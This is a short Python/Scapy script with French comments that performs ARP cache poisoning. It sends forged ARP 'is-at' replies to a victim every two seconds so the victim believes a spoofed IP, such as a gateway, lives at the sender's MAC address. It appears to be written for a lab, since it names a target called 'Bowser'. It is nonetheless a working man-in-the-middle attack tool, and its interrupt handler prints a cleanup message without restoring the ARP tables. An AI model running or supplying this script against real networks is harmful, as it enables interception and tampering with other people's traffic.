import sys

import time

from scapy.all import *



def arp_poison(victim_ip, fake_ip):

    print(f"[*] Récupération de l'adresse MAC de {victim_ip}...")

    # Récupère la MAC de la cible (ex: Bowser)

    victim_mac = getmacbyip(victim_ip)

    

    if not victim_mac:

        print(f"[!] Impossible de trouver la MAC de {victim_ip}. Est-elle allumée ?")

        return



    # op=2 pour une réponse ARP (is-at)

    # psrc = l'IP qu'on usurpe (la gateway ou un autre client)

    # pdst = l'IP de la victime (Bowser)

    # hwdst = la MAC de la victime (Bowser)

    # Scapy mettra automatiquement notre MAC dans hwsrc (la source physique)

    arp_response = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=fake_ip)



    print(f"[*] Attaque lancée : {victim_ip} va croire que {fake_ip} est chez moi.")

    

    try:

        while True:

            # On envoie à la couche 3 (IP/ARP) donc on utilise send()

            send(arp_response, iface="eth1", verbose=False)

            time.sleep(2) 

    except KeyboardInterrupt:

        print("\n[!] Nettoyage de la table ARP (optionnel)...")